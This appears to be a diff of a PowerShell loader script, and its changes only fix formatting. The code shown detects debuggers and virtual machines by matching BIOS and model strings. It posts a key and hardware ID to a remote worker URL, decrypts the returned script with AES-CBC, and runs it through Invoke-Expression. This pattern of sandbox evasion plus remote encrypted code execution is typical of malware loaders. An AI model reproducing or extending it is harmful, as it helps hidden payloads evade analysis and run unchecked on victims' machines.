@@ -16,7 +16,8 @@ if ([System.Diagnostics.Debugger]::IsAttached) {
 function Test-VirtualEnvironment {
     try {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
-        $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue$vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
+        $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
+        $vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
         foreach ($kw in $vmKeywords) {
             if ($bios.Manufacturer -match$kw -or $comp.Model -match$kw -or $bios.SMBIOSBIOSVersion -match$kw) {
                 return $true
@@ -128,7 +129,7 @@ while ($true) {
 
             $sessionToken =$tokenResponse.token
             $scriptBody = @{ action = "get_script"; token = $sessionToken; hwid = $userHwid; key =$inputKey } | ConvertTo-Json
-            $scriptResponse = Invoke-RestMethod -Uri$workerUrl -Method Post -Body $scriptBody -Headers$customHeaders
+            $scriptResponse = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $scriptBody -Headers $customHeaders
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
@@ -161,7 +162,7 @@ while ($true) {
                         return [System.Text.Encoding]::UTF8.GetString($plainBytes)
                     }
 
-                    $decryptedScript = Decrypt-Payload-CBC$scriptResponse.data $scriptResponse.iv $userHwid
+                    $decryptedScript = Decrypt-Payload-CBC $scriptResponse.data $scriptResponse.iv $userHwid
                     Invoke-Expression $decryptedScript
                 } else {
                     Invoke-Expression $scriptResponse.script
